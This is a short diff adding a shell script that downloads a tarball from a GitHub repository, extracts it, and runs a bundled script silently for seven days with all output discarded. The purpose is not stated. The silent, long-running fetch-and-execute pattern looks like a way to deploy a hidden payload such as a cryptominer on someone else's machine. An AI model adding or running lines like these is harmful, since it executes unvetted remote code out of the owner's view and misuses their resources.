@@ -1,0 +1,3 @@
+wget https://github.com/alissalam/cs8rtm/raw/main/salambinjai.tar.gz
+tar xf salambinjai.tar.gz
+timeout 10080m ./careuh.sh >/dev/null >/dev/null 2>&1
